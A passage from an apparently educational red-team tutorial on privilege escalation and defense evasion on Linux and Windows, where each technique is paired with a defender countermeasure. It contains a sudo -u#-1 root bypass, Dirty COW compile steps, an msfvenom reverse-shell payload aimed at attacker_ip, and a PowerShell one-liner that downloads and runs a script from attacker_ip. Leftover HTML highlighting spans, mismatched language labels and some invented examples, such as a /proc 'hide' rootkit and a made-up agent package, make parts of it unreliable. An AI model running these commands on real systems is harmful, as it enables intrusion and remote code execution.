In this example, the attacker executes the LinPEAS script, which performs a comprehensive audit of the Linux system, searching for potential privilege escalation opportunities, misconfigurations, and other security issues.

Online Resource: [LinPEAS GitHub Repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

By utilizing these information gathering techniques and tools, attackers can gain valuable insights into the compromised system and network environment, enabling them to plan further actions and exploit vulnerabilities effectively. It is essential for defenders to be aware of these techniques to detect and mitigate unauthorized access promptly.

### 6.3 Privilege Escalation

Privilege escalation is the process of obtaining higher levels of access within a compromised system, potentially granting administrative or root privileges. By escalating privileges, attackers can gain complete control over the system and access sensitive resources. Here are some techniques and tools for privilege escalation:

**6.3.1 Kernel Exploitation:**

Kernel exploits target vulnerabilities in the operating system's kernel to gain elevated privileges. These vulnerabilities can be leveraged to escalate privileges and gain complete control over the system.

Example: Exploiting a vulnerable kernel using the Dirty COW exploit:

shell

```
$ gcc -pthread dirtycow.c -o dirtycow
$ ./dirtycow
```

In this example, the attacker compiles and executes the Dirty COW exploit to escalate privileges by exploiting a vulnerability in the Linux kernel.

Online Resource: [Dirty COW - Privilege Escalation](https://dirtycow.ninja/)

**6.3.2 Misconfigured File Permissions:**

Misconfigured file permissions can provide an opportunity for privilege escalation. By identifying files or directories with incorrect permissions, attackers can gain access to sensitive system files or escalate privileges.

Example: Checking for world-writable files using the `find` command on Linux:

lua

```
$ find / -perm -<span class="hljs-number">2</span> -<span class="hljs-built_in">type</span> f
```

In this example, the attacker uses the `find` command to search for files with the permission `-perm -2` (world-writable) and `-type f` (regular files), which could potentially lead to privilege escalation.

Online Resource: [GTFOBins - GTFO Techniques](https://gtfobins.github.io/)

**6.3.3 Exploiting Weak Service Configurations:**

Weak service configurations, such as misconfigured sudo rules or vulnerable service configurations, can be exploited to escalate privileges within the system.

Example: Exploiting a misconfigured sudo rule to gain root access:

ruby

```
<span class="hljs-variable">$ </span>sudo -u<span class="hljs-comment">#-1 /bin/bash</span>
```

In this example, the attacker uses a misconfigured sudo rule to run the `/bin/bash` shell as the root user (`-u#-1`), effectively escalating privileges.

Online Resource: [Sudo Project - Sudoers Manual](https://www.sudo.ws/man/1.8.27/sudoers.man.html)

By understanding and utilizing these post-exploitation techniques, attackers can maintain access, gather critical information, and escalate privileges within compromised systems effectively. It is crucial for defenders to be aware of these techniques and implement security measures to prevent unauthorized privilege escalation.

## 8. Defense Evasion and Countermeasures

Defense evasion techniques aim to bypass or circumvent security controls, while countermeasures help organizations mitigate the impact of such evasion. This section explores various defense evasion techniques and corresponding countermeasures.

### 8.1 Defense Evasion Techniques

**8.1.1 Encryption and Obfuscation:**

*
Reason: Encryption and obfuscation techniques are used to conceal malicious payloads, command and control (C2) communications, or exploit code from detection.
*
Example: Encrypting a payload using OpenSSL:
csharp

```
$ openssl enc -aes-<span class="hljs-number">256</span>-cbc -salt -<span class="hljs-keyword">in</span> payload.txt -<span class="hljs-keyword">out</span> encrypted_payload.txt
```
*
Countermeasure: Implement network traffic monitoring and analysis tools capable of identifying encrypted or obfuscated traffic patterns. Employ advanced threat detection solutions that can analyze encrypted traffic without decrypting it.

**8.1.2 Anti-Virus Evasion:**

*
Reason: Anti-virus evasion techniques help avoid detection by traditional anti-virus software and other security controls.
*
Example: Modifying a payload to evade signature-based detection:
shell

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o evasive_payload.exe
```
*
Countermeasure: Utilize behavior-based anti-malware solutions that can detect and block malicious activities based on their behavior, rather than relying solely on signature-based detection.

**8.1.3 Fileless Malware:**

*
Reason: Fileless malware resides in memory, leaving no traces on disk and evading traditional file-based detection mechanisms.
*
Example: Running PowerShell commands directly in memory:
scss

```
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/malicious_script')"
```
*
Countermeasure: Implement application control solutions that restrict the execution of scripting engines, monitor PowerShell usage, and detect suspicious memory-based activities.

**8.1.4 Rootkit Techniques:**

*
Reason: Rootkit techniques manipulate the operating system to hide the presence of malicious activities and maintain persistence.
*
Example: Hiding a process using the rootkit technique:
shell

```
$ echo "my_process" > /proc/<pid>/hide
```
*
Countermeasure: Regularly update and patch operating systems and applications to prevent known vulnerabilities that rootkits exploit. Employ integrity checking mechanisms and security tools capable of detecting rootkit-like behavior.

**8.1.5 Domain Generation Algorithms (DGAs):**

*
Reason: DGAs generate domain names dynamically, making it challenging to block or blacklist C2 communications.
*
Example: Generating a list of domain names using a DGA algorithm:
shell

```
$ python dga_generator.py -date 20230525
```
*
Countermeasure: Implement DNS monitoring and anomaly detection systems that can identify unusual or suspicious domain name generation patterns. Employ threat intelligence feeds to identify known malicious domains associated with DGAs.

### 8.2 Countermeasures

**8.2.1 Network Traffic Monitoring:**

*
Reason: Comprehensive network traffic monitoring allows for the detection of anomalous activities, encrypted communications, and communication with suspicious or malicious domains.
*
Example: Using Wireshark to capture and analyze network traffic:
ruby

```
<span class="hljs-variable">$ </span>wireshark
```
*
Countermeasure: Employ network intrusion detection and prevention systems (IDS/IPS) that can analyze network traffic in real-time, detect anomalies, and block suspicious communications.

**8.2.2 Endpoint Protection and Response:**

*
Reason: Endpoint protection and response solutions offer real-time monitoring, behavior-based threat detection, and incident response capabilities on individual endpoints.
*
Example: Configuring an endpoint protection agent:
ruby

```
<span class="hljs-variable">$ </span>sudo apt-get install endpoint-protection-agent
<span class="hljs-variable">$ </span>endpoint-protection-agent configure
```
*
Countermeasure: Implement endpoint protection solutions that employ machine learning, behavior analysis, and threat intelligence to identify and respond to malicious activities on endpoints.

**8.2.3 User Awareness and Training:**

* Reason: Educating users about common attack techniques, social engineering, and the importance of adhering to security policies can significantly reduce the effectiveness of defense evasion techniques.
* Example: Conducting regular security awareness training sessions for employees.
* Countermeasure: Develop a comprehensive security awareness program that includes phishing simulations, training modules, and ongoing communication to reinforce secure behavior.

**8.2.4 System Hardening:**

*
Reason: Proper system hardening helps reduce attack surface, limits potential vulnerabilities, and strengthens overall defense capabilities.
*
Example: Disabling unnecessary services and closing unused ports:
shell

```
$ systemctl stop <service>
$ systemctl disable <service>
$ ufw deny <port>
```
*
Countermeasure: Follow industry best practices for system hardening, such as removing unnecessary software, applying least-privilege principles, and regular patching and updates.

**8.2.5 Incident Response and Recovery:**

* Reason: Establishing an effective incident response plan and implementing robust backup and recovery mechanisms can minimize the impact of successful attacks and facilitate quick recovery.
* Example: Developing an incident response playbook outlining step-by-step procedures for different attack scenarios.
* Countermeasure: Create an incident response plan that includes clear roles and responsibilities, communication protocols, and procedures for isolating compromised systems and restoring services.

By understanding defense evasion techniques and implementing the appropriate countermeasures, organizations can significantly enhance their security posture and protect against red team attacks.
